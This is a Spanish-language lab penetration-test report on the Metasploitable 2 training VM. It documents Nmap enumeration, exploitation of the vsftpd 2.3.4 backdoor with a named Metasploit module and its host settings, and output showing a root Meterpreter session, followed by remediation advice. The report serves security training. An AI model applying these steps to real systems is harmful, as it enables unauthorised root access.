# Análisis de Vulnerabilidades y Explotación Controlada

## Información General

- Objetivo: Metasploitable 2
- Dirección IP: 192.168.56.101
- Sistema Operativo: Ubuntu 8.04
- Fecha: 2026-06-02

---

# Vulnerabilidad 1: VSFTPD 2.3.4 Backdoor

## Descripción

Durante la fase de enumeración se identificó el servicio FTP ejecutando la versión VSFTPD 2.3.4 en el puerto 21/TCP.

Esta versión contiene una puerta trasera (backdoor) introducida en una versión comprometida del software, permitiendo la ejecución remota de comandos.

---

## Evidencia de Enumeración

Resultado obtenido mediante Nmap:

```text
21/tcp open ftp vsftpd 2.3.4
```

---

## Validación de la Vulnerabilidad

Se utilizó el módulo:

```text
exploit/unix/ftp/vsftpd_234_backdoor
```

del framework Metasploit.

Configuración utilizada:

```text
RHOSTS = 192.168.56.101
LHOST  = 192.168.56.103
RPORT  = 21
```

---

## Resultado de la Explotación

```text
[+] 192.168.56.101:21 - Backdoor has been spawned!
[*] Meterpreter session 1 opened
```

La explotación fue exitosa y permitió obtener acceso remoto al sistema objetivo.

---

## Evidencia del Acceso

### Información del sistema

```text
Computer     : metasploitable.localdomain
OS           : Ubuntu 8.04
Architecture : i686
Meterpreter  : x86/linux
```

### Usuario comprometido

```text
Server username: root
```

### Verificación del sistema

```text
Linux metasploitable 2.6.24-16-server
```

### Privilegios obtenidos

```text
uid=0(root) gid=0(root)
```

---

## Impacto

La vulnerabilidad permite:

- Ejecución remota de comandos.
- Acceso completo al sistema.
- Obtención de privilegios de administrador (root).
- Compromiso total de la confidencialidad, integridad y disponibilidad.

---

## Evidencias

Capturas almacenadas en:

```text
screenshots/explotacion/
```

Archivos:

- Screenshot_2026-06-02_10_25_01.png
- Screenshot_2026-06-02_10_25_56.png
- Screenshot_2026-06-02_10_28_54.png
- Screenshot_2026-06-02_10_43_21.png

---

## Recomendaciones

- Actualizar VSFTPD a una versión segura.
- Implementar segmentación de red.
- Restringir acceso al servicio FTP.
- Aplicar monitoreo de accesos.
- Deshabilitar servicios innecesarios.

---

## Conclusión

Se confirmó exitosamente la explotación de la vulnerabilidad VSFTPD 2.3.4 Backdoor obteniendo acceso remoto con privilegios de root sobre el sistema objetivo.
